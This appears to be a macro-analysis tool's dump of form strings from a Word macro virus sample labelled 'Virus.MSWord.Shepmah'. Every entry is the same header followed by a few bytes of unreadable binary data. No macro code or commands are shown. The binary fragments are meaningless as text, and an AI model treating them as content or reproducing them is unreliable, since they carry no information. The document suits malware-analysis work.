VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�Փ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȅ�\�N߄�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q&�2D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�*ϩ�o�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�@���f�pdwt�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�V��jF��'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��v�sL'5%LfÇ6�Q��eC
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_#\d�{�c=M1�=Z���c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n���L�*[��XβrZa�A �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�( 0���mp�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�e4�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>t<g|��57+��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���jY"ވC
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�_&
x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�g)7V�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&2������(S�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�(П
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"T!��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���M�Ǧ�r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0{��!a�!>B����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P���9

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y]u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H�rĄ�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�S)נ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x-.��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��Bl
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˰sk"��,G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
we�.�[ʡ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�e���P	��v��v���`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Kup"9r$�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;f��u�-�/a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��%J��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M��ǀ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�|�bG�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�Ԏ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Cz
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q������U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�f�2t�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�I�$jȈ�����<`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�&/P6��$���f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hv$Z~#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F[Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vsM`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��7��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!H�=�(��l�43��7�q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݡ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.l$�Щ"Y�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I8�6��XqDPEE
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1}��48*��l�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}f�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2pA�dߥA�`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
),o]�iY�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Xx�ýP�4tT+-8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.��"��m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5Ls$�G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�s(�g 1�.�p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�o��2b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XS#�T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GRLq
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aZL3s��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p
�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N"+I�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q
� o�1��u�`	��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�[meO
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W9�p7R�~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nx�uc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JqS���T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I&`�0���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�~��G��OT��A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r&Ɨ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/=E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�Shs��0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I>�+��-�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BF~3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��%��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,-!:��@�1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KaPC�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��dS��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D24Su�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pY�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G`��HH�
q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����|@!�'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�4��9D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pL��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X$�p3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�#�pd.A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ఋ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�[E"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A]�@.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*���p��G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��L�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6A\0�/��-3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t�4�T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p3�D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���RP1s|�) P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NO"*A�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� H�h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UA���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Pr>��_��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%Z�,Q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(D3`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�>S0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�	��6�y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(D�pJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�!(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i8�p	�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hA�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�
c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�gr��\z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۰?�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s?��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�Rk�S��V
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u7u�o��u?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QZ��S;-��;����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��Z��z������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʩ�8a.��	��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v�0ڰ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Pg�:�\*2�`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�	��
��h��?��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@kVd@V���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�q���Zi{6F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t0	��?G�h�J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zc8�S/�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t5Xw��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
